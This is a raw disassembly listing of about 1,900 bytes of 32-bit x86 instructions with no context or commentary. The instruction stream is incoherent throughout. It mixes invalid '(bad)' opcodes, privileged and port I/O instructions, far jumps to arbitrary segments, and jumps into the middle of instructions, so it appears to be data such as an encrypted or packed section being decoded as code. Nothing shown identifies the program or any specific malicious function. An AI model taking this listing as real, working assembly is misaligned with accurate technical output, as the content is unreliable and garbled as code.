  4146d6:	jl     0x414679
  4146d8:	pop    ss
  4146d9:	inc    esi
  4146da:	dec    ebp
  4146db:	jo     0x4146f9
  4146dd:	mov    ebx,0x3ffd79d9
  4146e2:	push   0x707e06e5
  4146e7:	leave  
  4146e8:	pop    bp
  4146ea:	push   edx
  4146eb:	and    al,0xfa
  4146ed:	hlt    
  4146ee:	mov    cl,BYTE PTR [esi-0x384e1e7d]
  4146f4:	add    BYTE PTR [ebp+0x4a],cl
  4146f7:	add    bh,BYTE PTR [edx]
  4146f9:	call   0x897de1ab
  4146fe:	sub    BYTE PTR [ebp-0x3c],0x9c
  414702:	xor    eax,0x8a39e5c
  414707:	call   0x676c:0x8ae3d778
  41470e:	popa   
  41470f:	scas   al,BYTE PTR es:[edi]
  414710:	shl    bh,1
  414712:	repnz fs pop ds
  414715:	leave  
  414716:	xor    ch,ah
  414718:	dec    ebp
  414719:	or     cl,BYTE PTR [eax]
  41471b:	mov    bh,0xd8
  41471d:	jmp    0x414767
  41471f:	aam    0x9b
  414721:	cmp    edi,ebx
  414723:	hlt    
  414724:	fisubr WORD PTR [eax]
  414726:	push   ebx
  414727:	lods   al,BYTE PTR ds:[esi]
  414728:	in     al,dx
  414729:	inc    esp
  41472a:	xor    bh,ch
  41472c:	les    esi,FWORD PTR [eax+ecx*1]
  41472f:	shl    BYTE PTR [ebx-0x5a109522],0x6b
  414736:	xor    eax,0x776c5558
  41473b:	push   esi
  41473c:	jmp    0x4146d9
  41473e:	xor    BYTE PTR [esi+0x5f],dl
  414741:	cmp    bl,BYTE PTR [edx]
  414743:	cmp    BYTE PTR [ecx],dh
  414745:	mov    ch,0x72
  414747:	dec    ebp
  414748:	lods   al,BYTE PTR ds:[esi]
  414749:	test   eax,0xd8305685
  41474e:	push   eax
  41474f:	cmp    ah,BYTE PTR [ebp+ebx*8+0x4]
  414753:	mov    edi,0x8254ed5e
  414758:	jno    0x4147c2
  41475a:	mov    edi,0xc0fc842
  41475f:	jns    0x41475d
  414761:	push   cs
  414762:	xchg   edx,eax
  414763:	sahf   
  414764:	push   edi
  414765:	xor    eax,0x92e24ae9
  41476a:	(bad)  
  41476b:	loope  0x4147da
  41476d:	rcr    BYTE PTR [edx+0x7b984c5d],1
  414773:	adc    eax,0x5142b4bc
  414778:	test   bp,sp
  41477b:	add    esp,eax
  41477d:	call   0xd7025b23
  414782:	outs   dx,DWORD PTR ds:[esi]
  414783:	push   ss
  414784:	lahf   
  414785:	ss cmp esp,0x29
  414789:	xor    al,0x7f
  41478b:	stos   BYTE PTR es:[edi],al
  41478c:	mov    edx,0x2490017
  414791:	cmp    eax,0xdd560712
  414796:	xchg   ecx,edx
  414798:	mov    cl,0x5a
  41479a:	and    eax,0x13abf54d
  41479f:	xchg   esi,eax
  4147a0:	fnstenv [edi-0x6b]
  4147a3:	fnsave [eax-0x57491a96]
  4147a9:	xchg   edx,eax
  4147aa:	call   0xd06a1133
  4147af:	aad    0x1a
  4147b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147b2:	or     ah,ah
  4147b4:	jecxz  0x414770
  4147b6:	enter  0x7e49,0x36
  4147ba:	cmp    BYTE PTR [ecx+0x20831c88],bl
  4147c0:	data16 stc 
  4147c2:	scas   eax,DWORD PTR es:[edi]
  4147c3:	xor    BYTE PTR [ecx],bh
  4147c5:	push   esp
  4147c6:	mov    ebp,ebp
  4147c8:	inc    ecx
  4147c9:	cmp    DWORD PTR [esi],edi
  4147cb:	push   edi
  4147cc:	scas   al,BYTE PTR es:[edi]
  4147cd:	or     BYTE PTR ds:0xcaf85bd7,dl
  4147d3:	jns    0x4147ae
  4147d5:	push   ecx
  4147d6:	inc    esp
  4147d7:	add    ebx,DWORD PTR [ebx+0x6bab7a0]
  4147dd:	dec    eax
  4147de:	(bad)  
  4147df:	rol    BYTE PTR [esi-0x5efde4d3],cl
  4147e5:	adc    esi,DWORD PTR [edi+0x66]
  4147e8:	jae    0x41484e
  4147ea:	adc    DWORD PTR [ecx],edx
  4147ec:	add    esi,esp
  4147ee:	add    bl,bl
  4147f0:	adc    DWORD PTR [eax+0x6c],0xffffff9f
  4147f4:	jle    0x414826
  4147f6:	call   0x547e73db
  4147fb:	pop    ds
  4147fc:	sub    al,0xd1
  4147fe:	mov    ds:0x305359dc,eax
  414803:	jmp    0x27165a3
  414808:	scas   eax,DWORD PTR es:[edi]
  414809:	or     bl,ch
  41480b:	nop
  41480c:	xor    ecx,DWORD PTR es:[ebp-0x5abbfd80]
  414813:	xor    eax,0xdf46a056
  414818:	arpl   WORD PTR [esi+ebp*4+0x4d623812],si
  41481f:	inc    eax
  414820:	out    dx,eax
  414821:	pop    edx
  414822:	dec    edi
  414823:	xchg   edx,eax
  414824:	add    ch,BYTE PTR [edx+0x71]
  414827:	xchg   edi,eax
  414828:	jg     0x414850
  41482a:	test   eax,0x4834c208
  41482f:	inc    edi
  414830:	xor    BYTE PTR [ebx],cl
  414832:	push   esi
  414833:	push   edx
  414834:	repnz and bh,cl
  414837:	fcomi  st,st(4)
  414839:	inc    ebx
  41483a:	mov    ds:0xa0281b41,al
  41483f:	rcr    BYTE PTR [edi-0x2b],0x33
  414843:	pop    ss
  414844:	gs dec ecx
  414846:	mov    ebp,0x86ef8d94
  41484b:	push   edx
  41484c:	test   al,0x5e
  41484e:	mov    WORD PTR [edi-0xf848dd6],es
  414854:	jmp    0xb4fb:0x74d9f5ff
  41485b:	je     0x414822
  41485d:	sub    esp,esi
  41485f:	inc    ebp
  414860:	ror    BYTE PTR [edi],1
  414862:	pop    esp
  414863:	and    eax,0x4021a2d4
  414868:	xor    eax,0x2bfbaf7e
  41486d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41486e:	mov    ah,0x72
  414870:	lock addr16 (bad) 
  414873:	fmul   DWORD PTR [ebx+edx*1-0x11]
  414877:	ss pop ebx
  414879:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41487a:	cs cmp ebp,esi
  41487d:	dec    ecx
  41487e:	pop    ds
  41487f:	mov    ds:0xbb9127d0,eax
  414884:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414885:	dec    ecx
  414886:	hlt    
  414887:	push   esi
  414888:	mov    ch,0xed
  41488a:	ror    BYTE PTR [eax],1
  41488c:	mov    ebx,0x84086660
  414891:	xchg   edi,eax
  414892:	mov    ebp,0xccc01be2
  414897:	inc    eax
  414898:	and    ebx,DWORD PTR [eax+esi*2-0x2c]
  41489c:	shl    DWORD PTR [edi-0x2b],0xd9
  4148a0:	mov    ecx,DWORD PTR gs:[edi]
  4148a3:	jmp    0x90e757f5
  4148a8:	inc    eax
  4148a9:	enter  0x41f4,0xde
  4148ad:	popa   
  4148ae:	lock arpl WORD PTR cs:[esi+0x2],ax
  4148b3:	xor    dl,BYTE PTR [eax-0x55]
  4148b6:	jns    0x414855
  4148b8:	ds pop ebx
  4148ba:	and    ebx,edx
  4148bc:	mov    bh,0xf5
  4148be:	sbb    eax,0x5e8c129
  4148c3:	jmp    0x7fcc:0xc0be9db6
  4148ca:	imul   edx,DWORD PTR [esi-0x7319af5b],0x39f2fff2
  4148d4:	sbb    ebp,edi
  4148d6:	cmc    
  4148d7:	test   BYTE PTR ds:0x4bc81a42,bh
  4148dd:	pop    edi
  4148de:	adc    eax,0xc1badd79
  4148e3:	aas    
  4148e4:	and    ecx,edx
  4148e6:	test   al,0xf5
  4148e8:	outs   dx,DWORD PTR ds:[esi]
  4148e9:	push   ss
  4148ea:	add    DWORD PTR [edi+0x47ce2a15],ebx
  4148f0:	add    DWORD PTR [esi-0x2c],ebp
  4148f3:	jmp    FWORD PTR [edx]
  4148f5:	(bad)  
  4148f7:	jae    0x41488e
  4148f9:	dec    edx
  4148fa:	pop    ecx
  4148fb:	das    
  4148fc:	in     eax,0x67
  4148fe:	stos   DWORD PTR es:[edi],eax
  4148ff:	inc    esp
  414900:	mov    edi,0x3ebf8309
  414905:	shr    DWORD PTR [eax-0x17d90011],cl
  41490b:	hlt    
  41490c:	aaa    
  41490d:	mov    edx,0x9d26d7a9
  414912:	or     BYTE PTR [ecx],bl
  414914:	vcmpss xmm2,xmm4,DWORD PTR [esp+esi*1],0x62
  41491a:	ins    BYTE PTR es:[edi],dx
  41491b:	mov    ds,esp
  41491d:	add    esi,DWORD PTR [esi-0x74]
  414920:	inc    cx
  414922:	(bad)  
  414923:	fwait
  414924:	mov    ah,0x79
  414926:	fsub   QWORD PTR [eax+0x6c6a8a8b]
  41492c:	push   0x892766ae
  414931:	add    al,0x14
  414933:	xchg   edx,eax
  414934:	inc    ebp
  414935:	ins    BYTE PTR es:[edi],dx
  414936:	pop    ds
  414937:	mov    esp,0x3be520e8
  41493c:	clc    
  41493d:	out    0xde,eax
  41493f:	add    esi,ebp
  414941:	xchg   edi,eax
  414942:	push   cs
  414943:	push   esi
  414944:	sbb    DWORD PTR [ebx-0x2858a765],esi
  41494a:	jmp    0x78ae2296
  41494f:	xlat   BYTE PTR ds:[ebx]
  414950:	push   esi
  414951:	and    ch,BYTE PTR [ebx+0x5ec2f950]
  414957:	adc    dh,BYTE PTR [ebp+eiz*8-0x2f]
  41495b:	aas    
  41495c:	or     eax,0x4cfede9c
  414961:	mov    DWORD PTR [eax-0x4dac2d3d],esp
  414967:	es cli 
  414969:	popf   
  41496a:	inc    ebx
  41496b:	popa   
  41496c:	bound  eax,QWORD PTR [edi+ebp*2+0x54]
  414970:	mov    ds:0xd08f2790,al
  414975:	adc    esi,ebp
  414977:	inc    ecx
  414978:	dec    eax
  414979:	jle    0x41492a
  41497b:	fsub   DWORD PTR [edi+0x16]
  41497e:	rol    ebp,0x3f
  414981:	fwait
  414982:	xor    esi,DWORD PTR [ebp-0x12]
  414985:	mov    WORD PTR [edi+0x34],?
  414988:	sbb    dh,BYTE PTR es:[eax+0x36028ea1]
  41498f:	and    BYTE PTR [esi+0x36],dh
  414992:	je     0x414958
  414994:	cwde   
  414995:	mov    DWORD PTR [eax+0x17],edi
  414998:	jl     0x41492b
  41499a:	inc    edi
  41499b:	and    DWORD PTR [eax+0x2cb7110c],ebp
  4149a1:	sahf   
  4149a2:	in     eax,0xbf
  4149a4:	shl    DWORD PTR [ebp-0x38],cl
  4149a7:	addr16 mov bl,0x71
  4149aa:	mov    ebx,DWORD PTR [ecx+0x2c]
  4149ad:	or     DWORD PTR [eax-0x21a0139b],0xfffffff2
  4149b4:	dec    ebp
  4149b5:	dec    ecx
  4149b6:	xchg   esi,eax
  4149b7:	inc    esi
  4149b8:	sbb    bl,BYTE PTR ds:0xeaae2329
  4149be:	jecxz  0x4149b8
  4149c0:	and    BYTE PTR [edx],cl
  4149c2:	xchg   BYTE PTR [edi+ebx*1-0x28],al
  4149c6:	lock addr16 in eax,dx
  4149c9:	pop    edi
  4149ca:	and    al,BYTE PTR [ebx]
  4149cc:	jns    0x4149d3
  4149ce:	and    al,0xca
  4149d0:	(bad)  
  4149d1:	sbb    edx,DWORD PTR [ecx-0x7]
  4149d4:	cmp    eax,0x78ea3339
  4149d9:	ret    0x118
  4149dc:	cmp    BYTE PTR [esi],bl
  4149de:	jbe    0x4149f8
  4149e0:	cwde   
  4149e1:	add    dl,bh
  4149e3:	es (bad) 
  4149e5:	outs   dx,DWORD PTR ds:[esi]
  4149e6:	(bad)  
  4149e7:	pushf  
  4149e8:	push   edi
  4149e9:	xchg   edi,eax
  4149ea:	push   0xe45bbfc3
  4149ef:	mov    ebp,?
  4149f1:	les    edi,FWORD PTR [edx+0x64]
  4149f4:	sti    
  4149f5:	add    bh,BYTE PTR [edi+0x2b]
  4149f8:	push   ds
  4149f9:	xchg   esi,eax
  4149fa:	out    0x79,al
  4149fc:	in     eax,dx
  4149fd:	push   ebp
  4149fe:	not    DWORD PTR [ecx+0xc]
  414a01:	mov    esp,0xf5304847
  414a06:	call   0xf42bd3c6
  414a0b:	iret   
  414a0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a0d:	fs jno 0x414a8c
  414a10:	gs dec edi
  414a12:	loopne 0x4149c0
  414a14:	adc    esp,edx
  414a16:	or     edx,DWORD PTR [ebx+edi*1-0x616ed3f9]
  414a1d:	inc    esi
  414a1e:	jo     0x414a09
  414a20:	test   al,0x42
  414a22:	adc    cl,dh
  414a24:	inc    ebp
  414a25:	cdq    
  414a26:	dec    ebx
  414a27:	ss push ebx
  414a29:	cdq    
  414a2a:	retf   
  414a2b:	or     ebx,ebx
  414a2d:	outs   dx,BYTE PTR ds:[esi]
  414a2e:	xor    BYTE PTR [ebp-0x4f20cbf6],0x2f
  414a35:	outs   dx,BYTE PTR ds:[esi]
  414a36:	fld    DWORD PTR [eax-0x5f]
  414a39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a3a:	sub    BYTE PTR [ecx-0x34535cb0],ch
  414a40:	xor    esp,ebp
  414a42:	and    BYTE PTR [ebx-0x4da9d345],dh
  414a48:	mov    al,0x8f
  414a4a:	repnz cwde 
  414a4c:	or     edx,DWORD PTR [esi+0x4b]
  414a4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a50:	fdivr  st(4),st
  414a52:	mov    edi,0xe0ab66d7
  414a57:	and    cl,BYTE PTR [ecx+0x29]
  414a5a:	mov    bl,0xf2
  414a5c:	mov    ecx,0x229a91dd
  414a61:	in     al,dx
  414a62:	inc    ecx
  414a63:	loopne 0x414a9f
  414a65:	xchg   esi,eax
  414a66:	inc    esi
  414a67:	call   0x177bf31f
  414a6c:	mov    WORD PTR [edx],es
  414a6e:	ss nop
  414a70:	sbb    esp,DWORD PTR ss:[edi]
  414a73:	imul   eax,DWORD PTR [ecx+0x7e],0xffffffa5
  414a77:	dec    edx
  414a78:	jne    0x4149fa
  414a7a:	push   ebx
  414a7b:	cmp    eax,0x78aee4d0
  414a80:	push   ebp
  414a81:	or     esp,ebx
  414a83:	and    esi,ebp
  414a85:	push   ebp
  414a86:	jp     0x414a32
  414a88:	mov    ecx,0x51f2b496
  414a8d:	mov    BYTE PTR [eax-0x78],ch
  414a90:	mov    ch,0xeb
  414a92:	in     al,0xe9
  414a94:	rcr    DWORD PTR [edx-0x24],0x92
  414a98:	fadd   QWORD PTR [ecx]
  414a9a:	lock cmp DWORD PTR fs:[edi+ecx*2-0x3155b150],ecx
  414aa3:	sub    al,0x2c
  414aa5:	add    DWORD PTR [edx-0x27],ebx
  414aa8:	xor    BYTE PTR [edx-0x1c],0xb4
  414aac:	ds addr16 into 
  414aaf:	es mov bh,0xc5
  414ab2:	outs   dx,BYTE PTR ds:[esi]
  414ab3:	not    DWORD PTR ds:0x25c0356
  414ab9:	add    DWORD PTR [ebx-0x66],0xffffff8a
  414abd:	mov    ch,0xf1
  414abf:	push   cs
  414ac0:	shr    DWORD PTR [eax+edi*2+0x27ca8187],1
  414ac7:	cmp    DWORD PTR [esi],esi
  414ac9:	mov    ch,0x41
  414acb:	(bad)
  414ace:	or     DWORD PTR [edi+0x14],ecx
  414ad1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ad2:	fcmovnu st,st(6)
  414ad4:	push   ebp
  414ad5:	or     ch,BYTE PTR [ecx]
  414ad7:	lea    ebp,[edx]
  414ad9:	push   ecx
  414ada:	jl     0x414b54
  414adc:	xor    cl,BYTE PTR [esi-0x1a8a8db7]
  414ae2:	mov    WORD PTR [edx],gs
  414ae4:	lods   al,BYTE PTR ds:[esi]
  414ae5:	xchg   ebx,eax
  414ae6:	ror    BYTE PTR [esi+0x1059ea16],0xf4
  414aed:	inc    eax
  414aee:	xchg   esp,eax
  414aef:	das    
  414af0:	add    BYTE PTR [eax+0x57],ch
  414af3:	test   DWORD PTR [esi],0xdab55811
  414af9:	or     esp,DWORD PTR [ecx+0x3d]
  414afc:	rep ins BYTE PTR es:[edi],dx
  414afe:	test   DWORD PTR [ebx+0x86ec1e0],edi
  414b04:	sbb    bl,BYTE PTR [ecx-0x78]
  414b07:	mov    eax,0xf04cc99e
  414b0c:	adc    DWORD PTR [ebx+0x1279a845],edx
  414b12:	idiv   BYTE PTR [eax+edi*2]
  414b15:	mov    ds:0x551d7636,al
  414b1a:	sub    eax,DWORD PTR [eax-0x1a66ba6a]
  414b20:	and    dh,BYTE PTR [edi]
  414b22:	add    eax,0x19a7ce4b
  414b27:	loopne 0x414b8b
  414b29:	cmp    BYTE PTR [eax+0x4faf1598],cl
  414b2f:	jne    0x414ae1
  414b31:	sahf   
  414b32:	cs push esp
  414b34:	adc    BYTE PTR [ecx+0x1a],bh
  414b37:	mov    BYTE PTR ds:0xe785c6cc,dl
  414b3d:	cs icebp 
  414b3f:	fcmovb st,st(6)
  414b41:	xor    eax,0xe742ea8
  414b46:	and    BYTE PTR [eax+0x30],al
  414b49:	cmp    bl,al
  414b4b:	push   0x9083435b
  414b50:	and    ch,BYTE PTR [edx+0x8]
  414b53:	add    ah,BYTE PTR [edi]
  414b55:	mov    ebp,0x4ac9064e
  414b5a:	stos   BYTE PTR es:[edi],al
  414b5b:	sbb    ch,BYTE PTR [ebx-0x3b1ba6fe]
  414b61:	mov    al,ds:0x7e2404f7
  414b66:	jg     0x414af2
  414b68:	(bad)  
  414b6a:	sbb    ebp,ebp
  414b6c:	xchg   edx,eax
  414b6d:	lea    edx,[eax+0x4d]
  414b70:	aam    0xf6
  414b72:	cwde   
  414b73:	cmc    
  414b74:	adc    BYTE PTR [edi],al
  414b76:	push   eax
  414b77:	add    ebx,DWORD PTR [edi-0xc73568d]
  414b7d:	dec    esp
  414b7e:	leave  
  414b7f:	sbb    dh,cl
  414b81:	jbe    0x414b68
  414b83:	xlat   BYTE PTR ds:[ebx]
  414b84:	add    bh,BYTE PTR [eax]
  414b86:	cli    
  414b87:	or     al,0x2e
  414b89:	scas   al,BYTE PTR es:[edi]
  414b8a:	pop    ecx
  414b8b:	xchg   edi,eax
  414b8c:	scas   eax,DWORD PTR es:[edi]
  414b8d:	scas   al,BYTE PTR es:[edi]
  414b8e:	fs clc 
  414b90:	sbb    DWORD PTR [ecx],esi
  414b92:	jg     0x414bfb
  414b94:	fimul  WORD PTR [esi+0x386623cc]
  414b9a:	cwde   
  414b9b:	cmp    DWORD PTR [edi],edi
  414b9d:	mov    ebp,0x5a2daf97
  414ba2:	rcl    BYTE PTR [edi],1
  414ba4:	mov    bl,BYTE PTR [ebx+0x57]
  414ba7:	push   ebx
  414ba8:	and    DWORD PTR [edx+0x2752c86b],ebp
  414bae:	xchg   edx,eax
  414baf:	cs add al,0xbc
  414bb2:	in     al,dx
  414bb3:	fsubr  DWORD PTR [edx]
  414bb5:	cmp    al,dl
  414bb7:	mov    ch,0x4a
  414bb9:	ss xchg esp,eax
  414bbb:	add    DWORD PTR [ebx+ebx*4+0x7304bfcf],0xffffff90
  414bc3:	outs   dx,BYTE PTR ds:[esi]
  414bc4:	sbb    bh,al
  414bc6:	sub    eax,0xe8e757ad
  414bcc:	pop    ebx
  414bcd:	retf   
  414bce:	rol    bl,1
  414bd0:	jmp    0xb5c695f6
  414bd5:	test   al,0x1a
  414bd7:	inc    esp
  414bd8:	loop   0x414b6f
  414bda:	xchg   ebp,eax
  414bdb:	jbe    0x414bdd
  414bdd:	into   
  414bde:	sbb    ch,BYTE PTR ds:0xad3da3c7
  414be4:	jmp    0x304c:0xe12a41ca
  414beb:	pop    ebx
  414bec:	je     0x414ba2
  414bee:	sbb    BYTE PTR [esi],dl
  414bf0:	std    
  414bf1:	cmp    al,BYTE PTR [edx]
  414bf3:	retf   0xfb31
  414bf6:	inc    ebp
  414bf7:	int    0x91
  414bf9:	mov    edx,0xb31b737c
  414bfe:	(bad)  
  414bff:	jle    0x414c35
  414c01:	xor    eax,0x8370d29
  414c06:	stc    
  414c07:	jnp    0x414bec
  414c09:	stos   DWORD PTR es:[edi],eax
  414c0a:	fcom   QWORD PTR [esi+0x26]
  414c0d:	call   DWORD PTR [ebp-0x47a545f8]
  414c13:	inc    eax
  414c14:	jo     0x414c66
  414c16:	jecxz  0x414c63
  414c18:	dec    esi
  414c19:	and    al,0x31
  414c1b:	push   edx
  414c1c:	std    
  414c1d:	leave  
  414c1e:	fild   QWORD PTR [edx]
  414c20:	push   0xffffffe0
  414c22:	mov    esp,0x69e6d7f0
  414c27:	or     al,0x24
  414c29:	fdiv   DWORD PTR [eax-0x70]
  414c2c:	cli    
  414c2d:	mov    bl,0x84
  414c2f:	fmul   QWORD PTR [eax]
  414c31:	jo     0x414bf2
  414c33:	idiv   DWORD PTR [edx+ebx*8+0x3ecc1c2c]
  414c3a:	and    eax,0x435daf4e
  414c3f:	xor    cl,BYTE PTR [ecx+0x7a]
  414c42:	xchg   esp,eax
  414c43:	xor    al,0xc0
  414c45:	pop    ebx
  414c46:	out    0xa1,eax
  414c48:	call   0xe61aa25f
  414c4d:	mov    dh,0x78
  414c4f:	mov    bh,0xb8
  414c51:	imul   edi,DWORD PTR [edi],0x6d
  414c54:	jnp    0x414c0b
  414c56:	out    dx,eax
  414c57:	and    bl,al
  414c59:	lods   al,BYTE PTR ds:[esi]
  414c5a:	(bad)  
  414c5b:	clc    
  414c5c:	mov    esi,0x8afe1b5d
  414c61:	sbb    al,0x4d
  414c63:	iret   
  414c64:	clc    
  414c65:	add    ah,BYTE PTR [esi-0x25]
  414c68:	scas   eax,DWORD PTR es:[edi]
  414c69:	aas    
  414c6a:	call   0x1da7:0x4e137a8d
  414c71:	mov    ebp,0x4c28fcf4
  414c76:	xchg   ecx,eax
  414c77:	or     DWORD PTR [ecx+0x60b4a1e9],ebx
  414c7d:	mov    DWORD PTR ds:[edx],ebx
  414c80:	cmp    al,0xfa
  414c82:	fist   DWORD PTR [edi]
  414c84:	jo     0x414c1f
  414c86:	iret   
  414c87:	fldenv [edx]
  414c89:	and    al,0x74
  414c8b:	iret   
  414c8c:	sbb    ch,BYTE PTR [ecx+0x4b]
  414c8f:	cmp    ebp,edi
  414c91:	jne    0x414c4b
  414c93:	int3   
  414c94:	dec    edi
  414c95:	fs in  eax,dx
  414c97:	jo     0x414c2c
  414c99:	fbld   TBYTE PTR [esi+0x7e]
  414c9c:	test   BYTE PTR [ebx-0x7b2af349],bh
  414ca2:	call   FWORD PTR [ecx+0x42]
  414ca5:	adc    al,0x78
  414ca7:	sub    dh,BYTE PTR [ebx-0x19]
  414caa:	dec    edx
  414cab:	pop    esi
  414cac:	loopne 0x414c78
  414cae:	pop    esp
  414caf:	mov    bh,0x43
  414cb1:	in     al,dx
  414cb2:	push   cs
  414cb3:	sub    ebx,eax
  414cb5:	xor    al,0xda
  414cb7:	push   ss
  414cb8:	xchg   edx,eax
  414cb9:	dec    esp
  414cba:	jmp    0x414d10
  414cbc:	mov    DWORD PTR [edx-0x8],ebp
  414cbf:	and    esp,DWORD PTR [ebp-0x7a4cb00f]
  414cc5:	ss fcomi st,st(1)
  414cc8:	xor    ecx,0x56
  414ccb:	pop    ds
  414ccc:	adc    eax,0xab9855b4
  414cd1:	ret    
  414cd2:	or     BYTE PTR [esi-0x6d164332],bl
  414cd8:	(bad)  
  414cd9:	fisubr DWORD PTR [ebp+0x40]
  414cdc:	and    DWORD PTR [eax+edx*2-0x106f6de4],ebp
  414ce3:	lods   al,BYTE PTR ds:[esi]
  414ce4:	dec    esi
  414ce5:	fistp  WORD PTR [esi+0x6646d098]
  414ceb:	mov    cs,WORD PTR [esi+0x6a7427f5]
  414cf1:	jmp    0x414d24
  414cf3:	sbb    BYTE PTR [esi],ah
  414cf5:	dec    esp
  414cf6:	and    edi,DWORD PTR [edi-0x6c]
  414cf9:	sahf   
  414cfa:	sub    ch,bl
  414cfc:	inc    ecx
  414cfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414cfe:	jbe    0x414cca
  414d00:	inc    ebx
  414d01:	das    
  414d02:	jmp    0x9b5e530b
  414d07:	call   0x18bcf0b
  414d0c:	jg     0x414d47
  414d0e:	dec    ebx
  414d0f:	int3   
  414d10:	mov    ch,0xf3
  414d12:	stos   DWORD PTR es:[edi],eax
  414d13:	mov    dh,0x25
  414d15:	and    cl,BYTE PTR [edi+0x2]
  414d18:	xchg   esp,eax
  414d19:	fsubrp st(0),st
  414d1b:	and    DWORD PTR [ebx+0x1d],0x9d1a98ff
  414d22:	ins    BYTE PTR es:[edi],dx
  414d23:	ja     0x414d40
  414d25:	pop    ecx
  414d26:	dec    eax
  414d27:	ds jnp 0x414ce2
  414d2a:	mov    BYTE PTR [esi],ch
  414d2c:	ins    BYTE PTR es:[edi],dx
  414d2d:	std    
  414d2e:	int3   
  414d2f:	mov    al,0x54
  414d31:	mov    bh,0x2f
  414d33:	lods   al,BYTE PTR ds:[esi]
  414d34:	mov    WORD PTR [ecx+0x28],gs
  414d37:	xchg   DWORD PTR [eax],ebx
  414d39:	push   ebx
  414d3a:	rol    BYTE PTR [ecx+0x5c69c62a],0x8
  414d41:	or     eax,0xaa733cda
  414d46:	cld    
  414d47:	and    DWORD PTR [edx+esi*2-0x74a88fda],eax
  414d4e:	aam    0x6c
  414d50:	cld    
  414d51:	jmp    0x3adb:0xf2e62b5d
  414d58:	(bad)  
  414d59:	(bad)  
  414d5a:	sbb    eax,edx
  414d5c:	mov    ah,0x48
  414d5e:	aaa    
  414d5f:	cdq    
  414d60:	fwait
  414d61:	bound  esp,QWORD PTR [edx]
  414d63:	lahf   
  414d64:	push   ss
  414d65:	cmp    al,0x8e
  414d67:	adc    cl,BYTE PTR [ebp+0x11]
  414d6a:	dec    edx
  414d6b:	ins    BYTE PTR es:[edi],dx
  414d6c:	js     0x414da4
  414d6e:	xchg   edi,eax
  414d6f:	adc    edx,edx
  414d71:	inc    ebp
  414d72:	ins    DWORD PTR es:[edi],dx
  414d73:	jmp    0x414d18
  414d75:	fld    QWORD PTR [ebp-0x41dee534]
  414d7b:	sub    dl,0x97
  414d7e:	sub    al,0xa8
  414d80:	sub    al,0x4c
  414d82:	push   esp
  414d83:	xor    ch,0xb5
  414d86:	fldcw  WORD PTR [ebx-0x10]
  414d89:	cmp    BYTE PTR [eax+0x2113204c],bh
  414d8f:	sub    al,0x98
  414d91:	fldcw  WORD PTR [eax-0x46c285f0]
  414d97:	xchg   esi,eax
  414d98:	loop   0x414d94
  414d9a:	mov    bl,0xa2
  414d9c:	clc    
  414d9d:	and    al,0xba
  414d9f:	es daa 
  414da1:	(bad)  
  414da2:	xchg   esp,eax
  414da3:	mov    cl,0x3f
  414da5:	gs pop eax
  414da7:	dec    ebp
  414da8:	jg     0x414db5
  414daa:	mov    cl,BYTE PTR [eax+0x63d68ef9]
  414db0:	or     eax,0xfe492646
  414db5:	xor    bh,BYTE PTR [edi+0x7fe62b0e]
  414dbb:	out    dx,al
  414dbc:	mov    WORD PTR [edx-0x9],gs
  414dbf:	sub    edx,edi
  414dc1:	mov    ds:0xcc92d7b3,al
  414dc6:	add    BYTE PTR [esi],ah
  414dc8:	jl     0x414d83
  414dca:	stc    
  414dcb:	hlt    
  414dcc:	add    al,0xf2
  414dce:	loop   0x414d52
  414dd0:	or     DWORD PTR [edx+ebx*8-0x1841d5c0],edi
  414dd7:	hlt    
  414dd8:	outs   dx,DWORD PTR ds:[esi]
  414dd9:	pop    ecx
  414dda:	cwde   
  414ddb:	inc    edx
  414ddc:	sbb    DWORD PTR [edx-0x1d],edi
  414ddf:	data16 jge 0x414dd0
  414de2:	rcr    dl,cl
  414de4:	sahf   
  414de5:	cli    
  414de6:	loopne 0x414e3c
  414de8:	mov    bl,0xad
  414dea:	xor    ebp,eax
  414dec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ded:	sub    ecx,esp
  414def:	dec    eax
  414df0:	pop    ds
  414df1:	jnp    0x414e71
  414df3:	ja     0x414e18
  414df5:	clc    
  414df6:	mov    eax,DWORD PTR [edi]
  414df8:	icebp  
  414df9:	adc    BYTE PTR [ecx-0x3a],cl
  414dfc:	sar    DWORD PTR [eax+ebp*8],1
  414dff:	mov    al,BYTE PTR [eax]
  414e01:	movlps QWORD PTR [esi],xmm6
  414e04:	out    dx,eax
  414e05:	sbb    BYTE PTR [ebp+0x9],ah
  414e08:	rcl    BYTE PTR [ebp+0xa],cl
  414e0b:	into   
  414e0c:	push   cs
  414e0d:	arpl   WORD PTR [edx-0x51671ab3],cx
  414e13:	xor    eax,0x341a09e7
  414e18:	and    esi,DWORD PTR [ebx]
  414e1a:	inc    ecx
  414e1b:	stos   BYTE PTR es:[edi],al
  414e1c:	clc    
  414e1d:	dec    esi
  414e1e:	cwde   
  414e1f:	fcomip st,st(6)
  414e21:	mov    dl,0xeb
  414e23:	and    eax,0x1b26cf9
  414e28:	cmp    BYTE PTR [edx-0x6220a3d6],bl
  414e2e:	aas    
  414e2f:	stos   BYTE PTR es:[edi],al
  414e30:	shl    DWORD PTR [esi-0x13ea54f2],0x27
  414e37:	pop    esi
  414e38:	fwait
  414e39:	xchg   ebx,eax
  414e3a:	xchg   esp,eax
  414e3b:	dec    ebx
  414e3c:	in     al,0xbb
  414e3e:	out    dx,eax
  414e3f:	pop    ecx
  414e40:	pop    ecx
  414e41:	cmp    al,0x1
  414e43:	and    eax,0xd683644c
  414e48:	lods   al,BYTE PTR ds:[esi]
  414e49:	(bad)  [esi+0x0]
  414e4c:	aad    0xac
  414e4e:	mov    esi,0xc9388a4c
  414e53:	(bad)  
  414e54:	or     al,0xda
  414e56:	push   0xffffffa1
  414e58:	lods   eax,DWORD PTR ds:[esi]
  414e59:	loope  0x414ea9
  414e5b:	and    esp,DWORD PTR [edi-0x4a]
  414e5e:	mov    DWORD PTR es:0x6aa90435,eax
  414e65:	dec    ebx
  414e66:	in     al,0xfa
  414e68:	call   0x77a:0x31be454a
